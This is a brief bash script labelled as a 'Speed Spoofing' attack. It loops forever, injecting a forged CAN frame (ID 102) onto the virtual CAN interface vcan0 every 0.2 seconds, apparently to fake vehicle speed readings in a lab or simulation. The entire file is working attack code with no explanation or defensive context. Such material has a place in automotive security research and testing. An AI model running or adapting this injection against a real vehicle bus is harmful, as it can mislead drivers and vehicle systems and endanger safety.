#!/bin/bash

echo "[ATTACK] Speed Spoofing started..."

while true
do
    cansend vcan0 102#F000000000000000

    sleep 0.2
done